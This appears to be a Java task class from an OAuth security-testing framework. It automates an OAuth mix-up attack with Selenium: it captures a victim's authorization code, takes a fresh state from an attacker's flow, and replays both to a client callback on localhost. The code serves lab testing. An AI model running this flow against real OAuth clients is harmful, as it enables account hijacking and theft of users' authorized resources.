package com.gsf.executor.api.task;

import com.gsf.executor.api.entity.UserTemplate;
import com.gsf.executor.api.repository.UserTemplateMemoryRepository;

public class OAuthMixUpAttackTask extends GenericTask {

    public OAuthMixUpAttackTask(){}

    public OAuthMixUpAttackTask(UserTemplate client) {
        super(client);
    }

    @Override
    public void executeTask(UserTemplate user) {

        LOGGER.info("OAuthMixUpAttackTask Init "+ user);

        seleniumConfig.initDriver();

        accessVulnerableClient(user);

        LOGGER.info("OAuthMixUpAttackTask accessAuthorisationServer  "+ seleniumConfig.getCurrentUrl());
        accessAuthorisationServer(user, seleniumConfig.getCurrentUrl());

        //passo 10 (extrair code da url) e chama e inicia um fluxo novo com um state(new)
        String currentUrl = seleniumConfig.getCurrentUrl();
        String code = extractCode(currentUrl);
        LOGGER.info("OAuthMixUpAttackTask extract code from URL  "+ currentUrl);

        seleniumConfig.close();
        seleniumConfig.initDriver();

        UserTemplate userAttacker = UserTemplateMemoryRepository.findById(4); //ID:4 = Attacker
        LOGGER.info("OAuthMixUpAttackTask start a new OAuth flow (attacker)  "+ userAttacker);

        seleniumConfig.get(userAttacker.getSiteUrl());
        accessClient(userAttacker);

        //ignora e pega o state
        currentUrl = seleniumConfig.getCurrentUrl();
        String newState = extractState(currentUrl);
        LOGGER.info("OAuthMixUpAttackTask ignore URL and get a newState  "+ currentUrl);

        //chama o cliente callback passando code + state
        LOGGER.info("OAuthMixUpAttackTask calls client sending code=" + code + " and newState=" + newState);
        seleniumConfig.get("http://localhost:9001/client/callback?code=" + code + "&state=" + newState);

        //cliente redireciona para A-AS o recurso obtido

        seleniumConfig.close();

        LOGGER.info("OAuthMixUpAttackTask End  "+ user);
    }



}
